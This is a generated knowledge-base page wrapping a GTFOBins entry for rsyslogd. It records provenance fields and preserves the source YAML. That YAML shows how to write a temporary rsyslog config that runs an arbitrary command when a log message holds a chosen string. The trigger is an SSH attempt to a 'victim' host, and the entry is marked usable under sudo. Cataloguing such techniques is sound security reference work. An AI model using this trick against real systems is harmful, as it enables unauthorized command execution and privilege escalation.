---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# rsyslogd

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `rsyslogd` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsyslogd` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [rsyslogd](../../tools/linux/rsyslogd.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rsyslogd |
| name | rsyslogd |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/rsyslogd/ |

## Preserved Source Material

````yaml
_body: ''
_name: rsyslogd
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/rsyslogd
functions:
  command:
  - blind: true
    code: 'cat >/path/to/temp-file <<EOF

      module(load="imuxsock")

      :msg, contains, "somerandomstring" ^/path/to/command

      EOF


      rsyslogd -f /path/to/temp-file'
    comment: 'In order for this to work, one must be able to trigger one event containing the chosen string, e.g., `somerandomstring`.
      One possibility is to attempt to connect to the victim host via SSH, for example:


      ```

      ssh somerandomstring@victim.com

      ```'
    contexts:
      sudo: null
````
